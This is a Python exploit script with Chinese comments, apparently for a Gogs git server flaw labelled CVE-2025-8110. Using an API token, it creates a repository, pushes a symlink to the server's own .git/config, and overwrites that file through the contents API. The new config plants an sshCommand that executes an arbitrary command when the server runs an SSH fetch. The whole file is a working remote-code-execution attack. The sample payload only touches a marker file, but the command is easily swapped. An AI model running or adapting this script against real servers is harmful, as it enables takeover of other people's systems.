#!/usr/bin/env python3
"""
CVE-2025-8110 Pure Exploit Script
此脚本仅执行漏洞利用步骤（覆盖配置文件），不包含验证逻辑。
"""

import os
import sys
import base64
import time
import subprocess
import requests
import shutil
from pathlib import Path

# --- 配置部分 ---
GOGS_URL = "http://localhost:3000"
# Gogs Docker 容器内的标准仓库路径，如果目标环境不同需修改
# 格式: /data/git/gogs-repositories/{username}/{repo_name}.git/config
SERVER_REPO_BASE = "/data/git/gogs-repositories"
# RCE Payload: 当触发 ssh 连接时执行的命令
RCE_COMMAND = "touch /tmp/pwned_by_pure_exploit && /usr/bin/ssh"

class Color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

def log(msg, type="info"):
    if type == "info": print(f"{Color.BLUE}[*]{Color.RESET} {msg}")
    elif type == "success": print(f"{Color.GREEN}[+]{Color.RESET} {msg}")
    elif type == "error": print(f"{Color.RED}[-]{Color.RESET} {msg}")
    elif type == "warn": print(f"{Color.YELLOW}[!]{Color.RESET} {msg}")

def run_cmd(cmd, cwd=None):
    try:
        subprocess.run(cmd, shell=True, cwd=cwd, check=True, 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <API_TOKEN> [target_url]")
        sys.exit(1)

    token = sys.argv[1]
    base_url = sys.argv[2] if len(sys.argv) > 2 else GOGS_URL
    
    # 1. 获取用户信息
    log(f"Connecting to {base_url}...")
    try:
        r = requests.get(f"{base_url}/api/v1/user", headers={"Authorization": f"token {token}"})
        if r.status_code != 200:
            log("Invalid token or connection failed", "error")
            sys.exit(1)
        user = r.json()['username']
        log(f"Target User: {user}", "success")
    except Exception as e:
        log(f"Connection error: {e}", "error")
        sys.exit(1)

    # 2. 创建恶意仓库
    repo_name = f"exploit-{int(time.time())}"
    log(f"Creating repository: {repo_name}...")
    
    headers = {"Authorization": f"token {token}", "Content-Type": "application/json"}
    data = {"name": repo_name, "private": False, "auto_init": False} # Auto_init=False to avoid race condition/errors
    
    r = requests.post(f"{base_url}/api/v1/user/repos", headers=headers, json=data)
    if r.status_code != 201:
        log(f"Failed to create repo: {r.text}", "error")
        sys.exit(1)
    
    # 3.通过 Git 植入符号链接
    work_dir = Path(f"/tmp/{repo_name}")
    if work_dir.exists(): shutil.rmtree(work_dir)
    work_dir.mkdir()
    
    log("Cloning and preparing payload...")
    auth_url = base_url.replace("://", f"://{token}@") + f"/{user}/{repo_name}.git"
    
    if not run_cmd(f"git clone {auth_url} .", cwd=work_dir):
        log("Git clone failed", "error")
        sys.exit(1)

    # 创建指向服务端 config 文件的绝对路径符号链接
    # 能够绕过部分相对路径检查，且在 Docker 环境下位置固定
    target_config = f"{SERVER_REPO_BASE}/{user}/{repo_name}.git/config"
    symlink_file = "config_link"
    
    try:
        os.symlink(target_config, work_dir / symlink_file)
    except OSError as e:
        log(f"Symlink creation failed: {e}", "error")
        sys.exit(1)

    run_cmd(f"git add {symlink_file}", cwd=work_dir)
    run_cmd(f"git commit -m 'Add exploit symlink'", cwd=work_dir)
    
    log("Pushing malicious symlink...")
    if not run_cmd("git push origin master", cwd=work_dir):
        log("Git push failed", "error")
        sys.exit(1)

    # 4. 利用 API 覆盖文件
    log("Triggering file overwrite via API...")
    
    # RCE Payload: 配置 sshCommand 并设置一个虚假的 remote origin (SSH protocol)
    # 当服务器尝试 fetch 这个 origin 时，就会执行 sshCommand
    payload = f"""[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = true
\tsshCommand = {RCE_COMMAND}
[remote "origin"]
\turl = git@github.com:doesnotexist/repo.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
"""
    b64_content = base64.b64encode(payload.encode()).decode()
    
    put_url = f"{base_url}/api/v1/repos/{user}/{repo_name}/contents/{symlink_file}"
    put_data = {
        "message": "Trigger Exploit",
        "content": b64_content,
        "branch": "master"
    }
    
    r = requests.put(put_url, headers=headers, json=put_data)
    
    if r.status_code in [200, 201]:
        log("Exploit Successful! .git/config overwritten.", "success")
        print("-" * 50)
        print(f"Payload injected: {RCE_COMMAND}")
        print(f"Target Repo: {user}/{repo_name}")
        print("To trigger RCE, the server must perform a git fetch/pull via SSH on this repo.")
        print("Scenarios: Mirror sync, Migration, or Admin manual operation.")
        print("-" * 50)
    else:
        log(f"Exploit failed: {r.status_code} {r.text}", "error")
    
    # 清理本地临时文件
    shutil.rmtree(work_dir)

if __name__ == "__main__":
    main()
